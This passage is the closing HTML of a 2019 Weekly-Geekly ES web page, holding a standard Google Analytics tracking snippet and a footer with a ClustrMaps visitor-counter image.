  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>